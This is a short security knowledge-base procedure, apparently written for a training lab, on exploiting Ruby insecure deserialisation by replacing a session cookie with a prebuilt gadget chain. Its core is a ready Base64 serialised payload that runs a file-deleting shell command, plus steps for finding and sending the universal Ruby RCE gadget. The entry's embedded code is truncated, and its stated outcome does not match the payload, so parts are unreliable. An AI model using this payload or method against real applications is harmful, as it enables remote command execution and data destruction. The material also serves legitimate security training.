---
id: d84b425d-304b-49d2-b124-52e9e9868592
name: Exploiting Ruby Deserialisation Through Documented Gadget
type: procedure
verified: true
submitted: true
created_at: '2020-08-23T13:18:30.964760+00:00'
updated_at: '2023-05-26T18:37:23.129999+00:00'
platforms:
- Web
tags:
- '[[Insecure Deserialisation]]'
- '[[Web Applications]]'
---

# Exploiting Ruby Deserialisation Through Documented Gadget

**Status**: âœ“ Verified

## Summary

An attacker exploits the gadget code present in the application . An attacker will use multiple tools to identify the prebuilt gadgets. In this case pre built gadget is already available in the internet. 

## Description

# Description

An attacker exploits the gadget code present in the application . An attacker will use multiple tools to identify the prebuilt gadgets. In this case pre built gadget is already available in the internet.

# Instructions

1.Log in to the application and identify the session cookie . Session cookie contains a serialised objects. Send the request to the repeater.

2. Search the internet for "Ruby 2.x Universal [RCE](https://portswigger.net/web-security/os-command-injection)Gadget Chain" and copy the prebuilt gadget code.

**Code**: [[#!/usr/bin/env ruby

class Gem::StubSpecificatio]]

3. Copy the Base64 encoded object :

BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNzWwdvOh5HZW06OlNvdXJjZTo6U3BlY2lmaWNGaWxlBjoKQHNwZWNvOhtHZW06OlN0dWJTcGVjaWZpY2F0aW9uCDoRQGxvYWRlZF9mcm9tSSIlfHJtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IDE+JjIGOgZFVDoKQGRhdGEwOwkwbzsIADoRQGRldmVsb3BtZW50Rg==

4.URL encode the object and replace the session cookie value with the one from above step. 

5.Send the modified request to the server . Observe that you were able to access the* my account*  where there is a option to update the email.

## Platforms

- Web

## Tags

- [[Insecure Deserialisation]]
- [[Web Applications]]
